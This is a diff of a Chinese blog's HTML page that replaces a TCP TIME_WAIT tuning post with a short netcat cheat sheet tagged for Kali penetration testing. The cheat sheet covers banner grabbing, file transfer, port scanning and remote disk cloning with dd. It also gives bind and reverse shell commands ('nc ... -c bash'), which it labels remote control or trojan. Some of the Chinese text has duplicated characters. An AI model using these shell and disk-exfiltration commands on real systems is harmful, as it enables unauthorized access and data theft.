@@ -8,19 +8,19 @@
   
 
   
-  <title>LINUX下解决netstat查看TIME_WAIT状态过多问题 | Linux运维装逼指南</title>
+  <title>netcat-nc | Linux运维装逼指南</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="12345678910111213141516171819202122# netstat -an|awk &apos;/tcp/ &amp;#123;print $6&amp;#125;&apos;|sort|uniq -c     16 CLOSING    130 ESTABLISHED    298 FIN_WAIT1     13 FIN_WAIT2      9 LAST_ACK      7 LISTEN    103">
-<meta name="keywords" content="调优">
+  <meta name="description" content="⺴网网络工工具中的瑞士士军刀刀——小小身身材、大大智慧 侦听模式 / 传输模式 telnet / 获取banner信息 传输文文本信息 传输文文件/⺫目目录 加密传输文文件 远程控制/木木⻢马 加密所有流量 流媒体服务器 远程克隆硬盘">
+<meta name="keywords" content="Kali linux渗透测试">
 <meta property="og:type" content="article">
-<meta property="og:title" content="LINUX下解决netstat查看TIME_WAIT状态过多问题">
-<meta property="og:url" content="http://www.unix-like.com/2017/05/31/system/LINUX下解决netstat查看TIME-WAIT状态过多问题/index.html">
+<meta property="og:title" content="netcat-nc">
+<meta property="og:url" content="http://www.unix-like.com/2017/06/16/security/netcat-nc/index.html">
 <meta property="og:site_name" content="Linux运维装逼指南">
-<meta property="og:description" content="12345678910111213141516171819202122# netstat -an|awk &apos;/tcp/ &amp;#123;print $6&amp;#125;&apos;|sort|uniq -c     16 CLOSING    130 ESTABLISHED    298 FIN_WAIT1     13 FIN_WAIT2      9 LAST_ACK      7 LISTEN    103">
-<meta property="og:updated_time" content="2017-05-31T08:06:25.551Z">
+<meta property="og:description" content="⺴网网络工工具中的瑞士士军刀刀——小小身身材、大大智慧 侦听模式 / 传输模式 telnet / 获取banner信息 传输文文本信息 传输文文件/⺫目目录 加密传输文文件 远程控制/木木⻢马 加密所有流量 流媒体服务器 远程克隆硬盘">
+<meta property="og:updated_time" content="2017-06-16T02:05:54.930Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="LINUX下解决netstat查看TIME_WAIT状态过多问题">
-<meta name="twitter:description" content="12345678910111213141516171819202122# netstat -an|awk &apos;/tcp/ &amp;#123;print $6&amp;#125;&apos;|sort|uniq -c     16 CLOSING    130 ESTABLISHED    298 FIN_WAIT1     13 FIN_WAIT2      9 LAST_ACK      7 LISTEN    103">
+<meta name="twitter:title" content="netcat-nc">
+<meta name="twitter:description" content="⺴网网络工工具中的瑞士士军刀刀——小小身身材、大大智慧 侦听模式 / 传输模式 telnet / 获取banner信息 传输文文本信息 传输文文件/⺫目目录 加密传输文文件 远程控制/木木⻢马 加密所有流量 流媒体服务器 远程克隆硬盘">
   
     <link rel="alternative" href="/atom.xml" title="Linux运维装逼指南" type="application/atom+xml">
   
@@ -268,11 +268,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-system/LINUX下解决netstat查看TIME-WAIT状态过多问题" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-security/netcat-nc" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a rel="external nofollow" href="/2017/05/31/system/LINUX下解决netstat查看TIME-WAIT状态过多问题/" class="article-date">
-      <time datetime="2017-05-31T08:03:00.000Z" itemprop="datePublished">2017-05-31</time>
+      <a rel="external nofollow" href="/2017/06/16/security/netcat-nc/" class="article-date">
+      <time datetime="2017-06-16T01:48:47.000Z" itemprop="datePublished">2017-06-16</time>
 </a>
 
     </div>
@@ -286,7 +286,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      LINUX下解决netstat查看TIME_WAIT状态过多问题
+      netcat-nc
     </h1>
   
 
@@ -296,13 +296,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/system/">system</a>
+    <a class="article-category-link" href="/categories/security/">security</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/调优/">调优</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali-linux渗透测试/">Kali linux渗透测试</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -312,29 +312,35 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netstat -an|awk '/tcp/ &#123;print $6&#125;'|sort|uniq -c</span></div><div class="line">     16 CLOSING</div><div class="line">    130 ESTABLISHED</div><div class="line">    298 FIN_WAIT1</div><div class="line">     13 FIN_WAIT2</div><div class="line">      9 LAST_ACK</div><div class="line">      7 LISTEN</div><div class="line">    103 SYN_RECV</div><div class="line">   5204 TIME_WAIT</div><div class="line"></div><div class="line">状态：描述</div><div class="line">CLOSED：无连接是活动的或正在进行</div><div class="line">LISTEN：服务器在等待进入呼叫</div><div class="line">SYN_RECV：一个连接请求已经到达，等待确认</div><div class="line">SYN_SENT：应用已经开始，打开一个连接</div><div class="line">ESTABLISHED：正常数据传输状态</div><div class="line">FIN_WAIT1：应用说它已经完成</div><div class="line">FIN_WAIT2：另一边已同意释放</div><div class="line">ITMED_WAIT：等待所有分组死掉</div><div class="line">CLOSING：两边同时尝试关闭</div><div class="line">TIME_WAIT：另一边已初始化一个释放</div><div class="line">LAST_ACK：等待所有分组死掉</div></pre></td></tr></table></figure>
+        <ul>
+<li>⺴网网络工工具中的瑞士士军刀刀——小小身身材、大大智慧</li>
+<li>侦听模式 / 传输模式</li>
+<li>telnet / 获取banner信息</li>
+<li>传输文文本信息</li>
+<li>传输文文件/⺫目目录</li>
+<li>加密传输文文件</li>
+<li>远程控制/木木⻢马</li>
+<li>加密所有流量</li>
+<li>流媒体服务器</li>
+<li>远程克隆硬盘</li>
+</ul>
 <a id="more"></a>
-<p>如发现系统存在大量TIME_WAIT状态的连接，通过调整内核参数解决，</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/sysctl.conf</div></pre></td></tr></table></figure>
-<p>编辑文件，加入以下内容：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">net.ipv4.tcp_syncookies = 1</div><div class="line">net.ipv4.tcp_tw_reuse = 1</div><div class="line">net.ipv4.tcp_tw_recycle = 1</div><div class="line">net.ipv4.tcp_fin_timeout = 30</div></pre></td></tr></table></figure></p>
-<p>然后执行 <code>/sbin/sysctl -p</code> 让参数生效。</p>
-<p>net.ipv4.tcp_syncookies = 1 表示开启SYN cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭；</p>
-<p>net.ipv4.tcp_tw_reuse = 1 表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭；</p>
-<p>net.ipv4.tcp_tw_recycle = 1 表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭。</p>
-<p>net.ipv4.tcp_fin_timeout 修改系統默认的 TIMEOUT 时间</p>
-<p>下面附上TIME_WAIT状态的意义：</p>
-<p>客户端与服务器端建立TCP/IP连接后关闭SOCKET后，服务器端连接的端口</p>
-<p>状态为TIME_WAIT</p>
-<p>是不是所有执行主动关闭的socket都会进入TIME_WAIT状态呢？</p>
-<p>有没有什么情况使主动关闭的socket直接进入CLOSED状态呢？</p>
-<p>主动关闭的一方在发送最后一个 ack 后就会进入 TIME_WAIT 状态 停留2MSL（max segment lifetime）时间这个是TCP/IP必不可少的，也就是“解决”不了的。</p>
-<p>也就是TCP/IP设计者本来是这么设计的</p>
-<p>主要有两个原因</p>
-<p>1。防止上一次连接中的包，迷路后重新出现，影响新连接（经过2MSL，上一次连接中所有的重复包都会消失）</p>
-<p>2。可靠的关闭TCP连接</p>
-<p>在主动关闭方发送的最后一个 ack(fin) ，有可能丢失，这时被动方会重新发fin, 如果这时主动方处于 CLOSED 状态 ，就会响应 rst 而不是 ack。所以主动方要处于 TIME_WAIT 状态，而不能是 CLOSED 。</p>
-<p>TIME_WAIT 并不会占用很大资源的，除非受到攻击。</p>
-<p>还有，如果一方 send 或 recv 超时，就会直接进入 CLOSED 状态</p>
+<h1 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nc –nv 1.1.1.1 110</div><div class="line">nc –nv 1.1.1.1 25</div><div class="line">nc –nv 1.1.1.1 80</div></pre></td></tr></table></figure>
+<h1 id="NC——传输文文本信息"><a href="#NC——传输文文本信息" class="headerlink" title="NC——传输文文本信息"></a>NC——传输文文本信息</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc <span class="_">-l</span> -p 4444</div><div class="line">B:nc –nv 1.1.1.1 4444</div></pre></td></tr></table></figure>
+<h1 id="NC–传输文文件-目录"><a href="#NC–传输文文件-目录" class="headerlink" title="NC–传输文文件/目录"></a>NC–传输文文件/目录</h1><h2 id="传输文文件"><a href="#传输文文件" class="headerlink" title="传输文文件"></a>传输文文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -lp 333 &gt; 1.mp4</div><div class="line">B:nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1</div></pre></td></tr></table></figure>
+<p>或<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -q 1 -lp 333 &lt; a.mp4</div><div class="line">B: nc -nv 1.1.1.1 333 &gt; 2.mp4</div></pre></td></tr></table></figure></p>
+<h2 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:tar -cvf - music/ | nc -lp 333 –q 1</div><div class="line">B:nc -nv 1.1.1.1 333 | tar -xvf –</div></pre></td></tr></table></figure>
+<h2 id="加密传文文件"><a href="#加密传文文件" class="headerlink" title="加密传文文件"></a>加密传文文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -lp 333 | mcrypt --flush -Fbqd <span class="_">-a</span> rijndael-256 -m ecb &gt; 1.mp4</div><div class="line">B: mcrypt --flush -Fbq <span class="_">-a</span> rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</div></pre></td></tr></table></figure>
+<h1 id="NC–流媒体服务"><a href="#NC–流媒体服务" class="headerlink" title="NC–流媒体服务"></a>NC–流媒体服务</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A: cat 1.mp4 | nc -lp 333</div><div class="line">B: 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</div></pre></td></tr></table></figure>
+<h1 id="NC——端口口扫描"><a href="#NC——端口口扫描" class="headerlink" title="NC——端口口扫描"></a>NC——端口口扫描</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -nvz 1.1.1.1 1-65535</div><div class="line">nc –vnzu 1.1.1.1 1-1024</div></pre></td></tr></table></figure>
+<h1 id="NC–远程克隆硬盘"><a href="#NC–远程克隆硬盘" class="headerlink" title="NC–远程克隆硬盘"></a>NC–远程克隆硬盘</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A: nc -lp 333 | dd of=/dev/sda</div><div class="line">B: dd <span class="keyword">if</span>=/dev/sda | nc -nv 1.1.1.1 333 –q 1</div></pre></td></tr></table></figure>
+<h1 id="NC–远程控制"><a href="#NC–远程控制" class="headerlink" title="NC–远程控制"></a>NC–远程控制</h1><h2 id="正向"><a href="#正向" class="headerlink" title="正向:"></a>正向:</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -lp 333 -c bash</div><div class="line">B:nc 1.1.1.1 333</div></pre></td></tr></table></figure>
+<h2 id="反向"><a href="#反向" class="headerlink" title="反向:"></a>反向:</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -lp 333</div><div class="line">B:nc 1.1.1.1 333 -c bash</div></pre></td></tr></table></figure>
+<p><strong> 注:Windows用用户把bash改成cmd </strong></p>
+<h1 id="NC–NCAT"><a href="#NC–NCAT" class="headerlink" title="NC–NCAT"></a>NC–NCAT</h1><ul>
+<li>Nc缺乏加密和身身份验证的能力力</li>
+<li>Ncat包含于nmap工工具包中<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl</div><div class="line">B:ncat -nv 1.1.1.1 333 --ssl</div></pre></td></tr></table></figure></li>
+</ul>
 
       
     </div>
@@ -343,13 +349,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a rel="external nofollow" href="/2017/05/31/system/LINUX下解决netstat查看TIME-WAIT状态过多问题/">LINUX下解决netstat查看TIME_WAIT状态过多问题</a></p>
+        <p><span>本文标题:</span><a rel="external nofollow" href="/2017/06/16/security/netcat-nc/">netcat-nc</a></p>
         <p><span>文章作者:</span><a rel="external nofollow" href="/" title="访问 Linux运维装逼指南 的个人博客">Linux运维装逼指南</a></p>
-        <p><span>发布时间:</span>2017年05月31日 - 16时03分</p>
-        <p><span>最后更新:</span>2017年05月31日 - 16时06分</p>
+        <p><span>发布时间:</span>2017年06月16日 - 09时48分</p>
+        <p><span>最后更新:</span>2017年06月16日 - 10时05分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/05/31/system/LINUX下解决netstat查看TIME-WAIT状态过多问题/" title="LINUX下解决netstat查看TIME_WAIT状态过多问题">http://www.unix-like.com/2017/05/31/system/LINUX下解决netstat查看TIME-WAIT状态过多问题/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://www.unix-like.com/2017/05/31/system/LINUX下解决netstat查看TIME-WAIT状态过多问题/　　作者: Linux运维装逼指南" title=""></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/06/16/security/netcat-nc/" title="netcat-nc">http://www.unix-like.com/2017/06/16/security/netcat-nc/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://www.unix-like.com/2017/06/16/security/netcat-nc/　　作者: Linux运维装逼指南" title=""></span>
         </p>
         <p>
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
@@ -360,18 +366,9 @@
 
 <nav id="article-nav">
   
-    <a rel="external nofollow" href="/2017/06/02/system/使用命令行生成高强度密码/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          使用命令行生成高强度密码
-        
-      </div>
-    </a>
   
-  
-    <a rel="external nofollow" href="/2017/05/31/service/logrotate切割日志nginx和php配置/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">logrotate切割日志nginx和php配置</div>
+    <a rel="external nofollow" href="/2017/06/12/service/nginx安装/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">nginx安装</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -383,7 +380,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NC——TELNET-BANNER"><span class="toc-number">1.</span> <span class="toc-text">NC——TELNET / BANNER</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NC——传输文文本信息"><span class="toc-number">2.</span> <span class="toc-text">NC——传输文文本信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NC–传输文文件-目录"><span class="toc-number">3.</span> <span class="toc-text">NC–传输文文件/目录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#传输文文件"><span class="toc-number">3.1.</span> <span class="toc-text">传输文文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#传输目录"><span class="toc-number">3.2.</span> <span class="toc-text">传输目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#加密传文文件"><span class="toc-number">3.3.</span> <span class="toc-text">加密传文文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NC–流媒体服务"><span class="toc-number">4.</span> <span class="toc-text">NC–流媒体服务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NC——端口口扫描"><span class="toc-number">5.</span> <span class="toc-text">NC——端口口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NC–远程克隆硬盘"><span class="toc-number">6.</span> <span class="toc-text">NC–远程克隆硬盘</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NC–远程控制"><span class="toc-number">7.</span> <span class="toc-text">NC–远程控制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正向"><span class="toc-number">7.1.</span> <span class="toc-text">正向:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反向"><span class="toc-number">7.2.</span> <span class="toc-text">反向:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NC–NCAT"><span class="toc-number">8.</span> <span class="toc-text">NC–NCAT</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -437,13 +434,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a rel="external nofollow" href="/2017/06/02/system/使用命令行生成高强度密码/" title="上一篇: 使用命令行生成高强度密码">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a rel="external nofollow" href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a rel="external nofollow" href="/2017/05/31/service/logrotate切割日志nginx和php配置/" title="下一篇: logrotate切割日志nginx和php配置">
+            <a rel="external nofollow" href="/2017/06/12/service/nginx安装/" title="下一篇: nginx安装">
                 <i class="fa fa-angle-right"></i>
             </a>
         
